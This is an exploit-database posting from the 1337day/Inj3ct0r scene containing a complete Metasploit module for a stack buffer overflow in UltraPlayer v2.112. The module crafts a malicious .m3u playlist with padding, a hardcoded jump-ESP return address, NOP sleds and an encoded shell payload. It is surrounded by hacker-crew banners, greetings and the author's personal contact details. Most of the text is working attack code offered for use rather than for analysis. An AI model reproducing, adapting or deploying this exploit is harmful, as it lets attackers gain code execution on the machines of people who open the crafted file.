1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

###
# Title : UltraPlayer v2.112 (.m3u) Buffer Overflow Exploit (MSF)
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com | kedans@facebook.com
# Home : Hassi.Messaoud (30500) - Algeria -(00213555248701)
# Web Site : www.1337day.com
# platform : windows ( Local BOF via MSF)
# Type : local exploit / Buffer Overflow / Metasploit
###

##
# | >> --------+++=[ Dz Offenders Cr3w ]=+++-------- << |
# | > Indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3   |
# | Jago-dz * Over-X * Kha&miX * Ev!LsCr!pT_Dz * Dr.55h |
# | KinG Of PiraTeS * The g0bl!n * soucha * dr.R!dE  .. |
# | ------------------------------------------------- < |
###

##
# $Id: uplayer_bof.rb | 2012-01-23 21:30 | KedAns-Dz $
##

require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            'Name' => 'UltraPlayer v2.112 (.m3u) Stack Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in versions v2.112
                creating a specially crafted .m3u file, an attacker may be able 
                to execute arbitrary code.
			},
            'License' => MSF_LICENSE,
            'Author' => 'KedAns-Dz <ked-h[at]hotmail.com>',
            'Version' => 'Version 1',
            'References' =>
                [
                    [ 'URL', 'http://1337day.com/exploits/17432' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload' =>
                {
                    'Space' => 1024,
                    'BadChars' => "\x0a\x0d",
                    'StackAdjustment' => -3500,
                    'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
                    'EncoderOptions' =>
                      {
                        'BufferRegister' => 'ESI',
                      }
                },
            'Platform' => 'win',
            'Targets' =>
              [
                [ 'Windows XP SP3 France', { 'Ret' => 0x471230eb} ], # jump ESP - uplayer.exe
              ],
            'Privileged' => false,
            'DefaultTarget' => 0))
 
        register_options(
            [
                OptString.new('FILENAME', [ false, 'The file name.', 'msf.m3u']),
            ], self.class)
    end
 
 
    def exploit

      sploit = "http://" # Header
        sploit << rand_text_alpha_upper(313) # junk
        sploit << "/inj3ct0r.x"
        sploit << [target.ret].pack('V') # jump ESP - uplayer.exe
        sploit << make_nops(3) # nop / nop / nop
        sploit << rand_text_alpha_upper(88) # buf
        sploit << make_nops(3) # moor nops
        sploit << payload.encoded # payload backshell
        sploit << make_nops(48) # padding
        sploit << ".mp3" # end padd
		
        ked = sploit
        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(ked)
 
    end
 
end

# sP^tHanX & Gr33tZ t0 : Omar (www.l3b-r1z.com) | And My fr!ndS 0n HMD ^___^ <3 <3

#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]=====================================
# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > || Rizky Ariestiyansyah * Islam Caddy 
# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re * CrosS (www.1337day.com) 
# Inj3ct0r Members 31337 : Indoushka * KnocKout * Kalashinkov3 * SeeMe * ZoRLu * anT!-Tr0J4n
# Anjel Injection (www.1337day.com/team) * Dz Offenders Cr3w * Algerian Cyber Army * Sec4ever
# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * Jago-dz * Over-X
# Kha&miX * Str0ke * JF * Ev!LsCr!pT_Dz * KinG Of PiraTeS * www.packetstormsecurity.org * TreX
# www.metasploit.com * UE-Team & I-BackTrack * r00tw0rm.com * All Security and Exploits Webs ..
#=================================================================================================